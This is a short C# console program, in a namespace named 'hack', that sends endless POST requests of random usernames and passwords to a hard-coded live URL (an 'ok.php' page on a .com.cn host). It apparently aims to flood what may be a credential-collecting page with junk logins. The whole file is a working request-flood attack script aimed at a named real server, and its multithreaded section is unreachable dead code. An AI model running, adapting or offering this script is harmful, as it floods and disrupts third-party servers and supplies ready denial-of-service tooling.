using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace hack
{
    class Program
    {
        static void Main(string[] args)
        {
            while (true)
            {
                GetFuckCookie();
            }
            ThreadStart threadStart = new ThreadStart(GetFuckCookie);
            Thread[] threads = new Thread[10];
            while (true)
            {
                for (int i = 0; i < 10; i++)
                {
                    threads[i] = new Thread(threadStart);
                }
                foreach (Thread a in threads)
                {
                    a.Start();
                }
            }
        }

        private static void GetFuckCookie()
        {
            Random rand = new Random();
            string cmd = "u=" + rand.Next(2147483647) + "&p=" + GenerateRandomNumber(10) + "&bianhao=1";
            byte[] bytes = System.Text.Encoding.UTF8.GetBytes(cmd);
            string url = "http://host802124513.s321.pppf.com.cn/ok.php";
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

                request.Method = "POST";//这里是POST请求，可以改成GET
                request.ContentType = "application/x-www-form-urlencoded";
                request.ContentLength = bytes.Length;

                using (Stream reqStream = request.GetRequestStream())
                {
                    reqStream.Write(bytes, 0, bytes.Length);
                    reqStream.Close();
                }
                Console.WriteLine("当前线程：" + Thread.CurrentThread.ManagedThreadId);
                request.BeginGetResponse(new AsyncCallback(Compleate), request);
            }
            catch
            {
                Console.WriteLine("请求失败.");

            }
        }

        public static void Compleate(IAsyncResult asyncResult)
        {
            ;
        }
        private static char[] constant =
      {
        '0','1','2','3','4','5','6','7','8','9',
        'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
        'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'
      };
        public static string GenerateRandomNumber(int Length)
        {
            System.Text.StringBuilder newRandom = new System.Text.StringBuilder(62);
            Random rd = new Random();
            for (int i = 0; i < Length; i++)
            {
                newRandom.Append(constant[rd.Next(62)]);
            }
            return newRandom.ToString();
        }

    }
}
